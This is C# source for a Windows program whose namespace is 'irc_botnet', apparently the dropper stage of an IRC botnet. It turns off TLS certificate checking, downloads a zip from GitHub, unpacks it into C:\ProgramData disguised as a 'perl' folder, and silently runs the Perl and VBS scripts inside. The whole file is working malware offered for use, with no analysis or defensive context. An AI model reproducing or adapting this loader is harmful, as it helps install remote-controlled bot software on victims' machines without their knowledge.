using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace irc_botnet
{
    class Program
    {
        static void Main(string[] args)
        {
            //System.Diagnostics.Process.Start(@"SteamDep.exe");
            try
            {
                Directory.Delete(@"C:\ProgramData\perl", true);
            }
            catch { }
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://github.com/Paulo0819/irc-windows/archive/main.zip", @"C:\ProgramData\main.zip");
            System.Threading.Thread.Sleep(TimeSpan.FromSeconds(1));
            string zipPath = @"C:\ProgramData\main.zip";
            string extractPath = @"C:\ProgramData\";
            ZipFile.ExtractToDirectory(zipPath, extractPath);
            File.Delete(@"C:\ProgramData\main.zip");
            Directory.Move(@"C:\ProgramData\irc-windows-main", @"C:\ProgramData\perl");

            string executar = @" C:\ProgramData\perl\bin\mntemp.pl";
            System.Diagnostics.Process.Start(@"C:\ProgramData\perl\bin\wperl.exe", executar);
            /////////////////////////////////////////////////////////////////////////////////
            string executar1 = @"/C " + @"cd C:\ProgramData\perl\bin && start movstemp.vbs";
            System.Diagnostics.Process.Start(@"cmd.exe", executar1);
        }
    }
}
